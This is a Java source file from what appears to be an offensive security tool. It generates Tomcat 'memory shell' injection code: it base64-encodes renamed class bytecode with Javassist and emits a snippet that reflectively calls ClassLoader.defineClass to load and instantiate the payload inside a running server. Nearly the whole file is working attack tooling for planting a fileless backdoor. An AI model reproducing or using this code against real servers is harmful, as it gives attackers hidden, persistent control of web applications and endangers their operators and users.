package io.github.exp1orer.util;

import javassist.*;

import java.io.IOException;
import java.io.InputStream;
import java.util.Base64;

public class MemoryShell {
    private static MemoryShell instance = new MemoryShell();

    private MemoryShell() {}

    public static MemoryShell getInstance() {
        return instance;
    }

    public static String process(String name) {
        if ("".equals(name.trim()) || name == null) {
            return "";
        }

        return instance.tomcatMemoryShell(name + ".class");

    }

    /**
     * Tomcat内存马注入
     * @param className 类名
     * @return
     */
    private String tomcatMemoryShell(String className) {
        String payload = renameClass("User", "MyObjectLoader.class");
        String bytecodes = renameClass("Login", className);

        String code = String.format("String payload = \"%s\";\n" +
                "        String version = System.getProperty(\"java.version\");\n" +
                "        byte[] bytecodes;\n" +
                "\n" +
                "        try {\n" +
                "            if (version.compareTo(\"1.9\") >= 0) {\n" +
                "                Class base64 = Class.forName(\"java.util.Base64\");\n" +
                "                Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
                "                java.lang.reflect.Method[] methods = decoder.getClass().getMethods();\n" +
                "                java.lang.reflect.Method decode = null;\n" +
                "                for (int i = 0; i < methods.length; i++) {\n" +
                "                    java.lang.reflect.Method method = methods[i];\n" +
                "                    if (method.getName().equals(\"decode\") && method.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                        decode = method;\n" +
                "                    }\n" +
                "                }\n" +
                "                bytecodes = (byte[]) decode.invoke(decoder, new Object[]{payload});\n" +
                "            } else {\n" +
                "                Class base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                java.lang.reflect.Method[] methods = decoder.getClass().getMethods();\n" +
                "                java.lang.reflect.Method decodeBuffer = null;\n" +
                "                for (int i = 0; i < methods.length; i++) {\n" +
                "                    java.lang.reflect.Method method = methods[i];\n" +
                "                    if (method.getName().equals(\"decodeBuffer\") && method.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                        decodeBuffer = method;\n" +
                "                    }\n" +
                "                }\n" +
                "                bytecodes = (byte[]) decodeBuffer.invoke(decoder, new Object[]{payload});\n" +
                "            }\n" +
                "\n" +
                "            java.lang.reflect.Method[] methods = ClassLoader.class.getDeclaredMethods();\n" +
                "            java.lang.reflect.Method defineClassMethod = null;\n" +
                "            for (int i = 0; i < methods.length; i++) {\n" +
                "                java.lang.reflect.Method method = methods[i];\n" +
                "                if (method.getName().equals(\"defineClass\") && method.getParameterTypes().length == 3) {\n" +
                "                    defineClassMethod = method;\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "            defineClassMethod.setAccessible(true);\n" +
                "            Class cc = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n" +
                "            java.lang.reflect.Constructor[] constructors = cc.getConstructors();\n" +
                "            java.lang.reflect.Constructor c = null;\n" +
                "            for (int i = 0; i < constructors.length; i++) {\n" +
                "                java.lang.reflect.Constructor constructor = constructors[i];\n" +
                "                if (constructor.getParameterCount() == 1 && constructor.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                    c = constructor;\n" +
                "                }\n" +
                "            }\n" +
                "            c.newInstance(new Object[]{\"%s\"});\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }", payload, bytecodes);
        return code;
    }

    private String renameClass(String prefix, String resourceName) {
        String bytecodes = "";
        ClassPool pool = ClassPool.getDefault();
        InputStream is = this.getClass().getResourceAsStream("/" + resourceName);
        if (is == null) {
            return "";
        }

        try {
            CtClass ctClass = pool.makeClass(is);
            ctClass.setName(prefix + System.nanoTime());
            byte[] bytes = ctClass.toBytecode();
            bytecodes = Base64.getEncoder().encodeToString(bytes);
        } catch (IOException | CannotCompileException e) {
            e.printStackTrace();
        }

        return bytecodes;
    }
}
